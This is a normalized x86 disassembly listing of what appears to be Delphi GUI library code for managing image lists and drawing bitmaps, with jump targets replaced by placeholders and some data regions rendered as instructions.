call [ ebx + 0x50 ]
sub_43fd3c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x58 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1 ] al
mov al [ esp ]
mov [ ebx + 0x58 ] al
cmp al 0x1
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
test edi edi
je r-xdata
dec al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
cmp [ esp + 0x1 ] 0x2
jne r-xdata
test edi edi
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov dl [ edi + 0x94 ]
mov eax edi
call sub_44018c
cmp [ esp ] 0x2
jne r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov edi [ eax + ebp * 4 ]
mov al [ esp ]
sub al 0x1
jb r-xdata
mov al [ edi + 0x6a ]
mov [ edi + 0x94 ] al
mov dl 0x1
mov eax edi
call sub_44018c
sub_43fed4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a414
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax esi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_43ff28
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_4030f0
mov eax [ esi + 0x9c ]
call sub_4030f0
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43f7d8
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40cb14
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_43ff78
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_413f40
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_440024
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_440084
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_44018c
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_4402c4
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_440324
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_440380
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_4403e4
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_440024
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_4042b8
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_403f00
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032a0
test eax eax
je r-xdata
sub_440084
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_44017c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_43fb3c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_4032a0
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_43fb28
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_440084
sub_44018c
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032a0
test eax eax
je r-xdata
sub_440204
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_4042b8
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_403f00
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413860
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413860
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
sub_44026c
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032a0
test eax eax
je r-xdata
sub_4402c4
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_4042b8
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_403f00
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032a0
test eax eax
je r-xdata
sub_440324
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032a0
test eax eax
je r-xdata
sub_440380
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4032a0
test eax eax
je r-xdata
sub_4403e4
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_413860
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_4032a0
test eax eax
je r-xdata
sub_440444
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_4042b8
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_41a064
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_440024
sub_440490
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_4404b8
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_43f944
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_440084
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_44054c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4152ac
mov edi eax
mov eax esi
call sub_442f70
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_440578
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_4405bc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4405e1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4405e8
retn
sub_44061c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
inc esp
add [ esi + eax + 0x44 ] ch
add [ eax ] dl
add [ eax ] al
add [ eax + 0x20004010 ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x1c780040 ] ah
inc esp
add [ ecx ] al
add bh bh
[ esp + ebx + 0x540b0044 ]
sub_44066e
inc ebx
push 0x65676e61
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ ebx ] ecx
push esp
dec ecx
insd
popad
dec ecx
outsb
js r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
pop es
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + eax ] ah
inc esp
add [ edi + eax ] ch
inc esp
add [ eax ] ch
add [ eax ] al
sub al 0x21
inc ecx
add [ edx + 0x41 ] bh
add [ ebx + esi ] ch
inc eax
add al dl
fwait
inc ecx
add [ ebx + esi ] dh
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x7f80040 ] ah
inc esp
add [ eax + 0x12 ] cl
inc esp
add al dl
adc eax 0x11880044
inc esp
add [ edi + ebx * 4 + 0x41 ] bl
add [ eax ] ch
sahf
inc ecx
add [ edi + ebx * 4 + 0x41 ] ch
add [ eax + 0x41 ] ah
add [ edx - 0x6083ffbf ] dl
inc ecx
add [ edi + ebx * 4 + 0x41 ] dh
add [ edx + 0x7ac0041 ] bl
inc esp
add [ ebp + ecx + 0x44 ] bh
add [ eax + ecx + 0x44 ] ah
add [ edx + ebx + 0x1b100044 ] al
inc esp
add [ eax + 0x1004413 ] cl
add bh ch
[ eax + 0x10004413 ]
push esp
inc ebx
jne r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + eax + 0x44 ] al
mov eax 0x20000000
retn
je r-xdata
pop ds
retn
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] 0x4400408d
pop es
inc esp
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
ror [ ebx - 0x6cba173a ] cl
std
inc edi
inc esi
xor al 0x10
add [ eax ] al
add bh al
inc esi
xor [ eax ] dl
add [ eax ] al
add [ ebx - 0xef743a ] cl
push edx
xor al 0x8b
mov [ ebx + ebx * 8 + 0x6de80f74 ] 0x2c
cld
jmp [ edi + ecx * 4 + 0x5 ]
outsd
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
sub [ edx ] ah
inc ecx
add [ edx ] al
add [ edi ] al
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0xc08b0000
sub_4407ac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419b0c
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax esi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_4407f8
push ebx
push esi
push edi
call sub_403464
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_413948
mov edx eax
mov eax edi
call sub_4413e8
mov eax [ edi + 0x50 ]
call sub_4030f0
mov eax edi
call sub_440abc
mov eax [ edi + 0x4c ]
call sub_4030f0
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_419b58
test bl bl
jle r-xdata
call sub_4030f0
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40344c
sub_440864
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_440911
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_441370
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_4201d4
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_440930
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440918
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_440930
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4409d1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_4212bc
mov eax ebx
call sub_42079c
mov eax [ eax + 0x14 ]
xor edx edx
call sub_41d324
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_41242c
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_42079c
pop edx
call sub_41d6c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4409d8
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_4409f4
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_440930
pop ecx
pop edx
pop ebx
retn
sub_440a2c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_440abc
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4409f4
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_4032ec
sub_440a68
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4412f8
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_420808
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_440abc
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44091c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_4032ec
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_440a58
push eax
call ImageList_Destroy
sub_440af4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_440b87
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_44091c
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440b8e
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
mov edx eax
mov eax ebx
call sub_440d1c
sub_440b94
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4201d4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_440c43
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4201d4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_440c26
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_440924
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_440a68
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_440a68
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440c2d
mov eax [ ebp - 0x10 ]
call sub_4030f0
retn
sub_440c60
push ebx
mov ebx eax
mov eax ebx
call sub_44091c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_440a58
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_440c84
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_440d03
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_440c60
cmp esi eax
jl r-xdata
mov eax ebx
call sub_44091c
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
mov eax ebx
mov si 0xffef
call sub_4032ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440d0a
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
push esi
mov eax ebx
call sub_440a58
push eax
call ImageList_Remove
sub_440d1c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44091c
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_44076c
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_4032ec
pop esi
pop ebx
retn
sub_440d54
push ebx
mov ebx eax
mov eax ebx
call sub_44091c
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_440a58
push eax
call ImageList_GetBkColor
call sub_44078c
pop ebx
retn
sub_440d7c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_44091c
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_44076c
push eax
mov eax ebx
call sub_440d54
call sub_44076c
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_41dadc
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_440a58
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_42079c
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41d324
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_41242c
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_42079c
pop edx
call sub_41d6c8
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_42079c
call sub_41dadc
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_440a58
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_41242c
mov eax [ ebx + 0x54 ]
call sub_42079c
call sub_41dadc
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_41d324
mov eax edi
call sub_41dadc
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_41d324
mov eax edi
call sub_41dadc
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_4201d4
mov esi eax
mov [ ebx + 0x54 ] esi
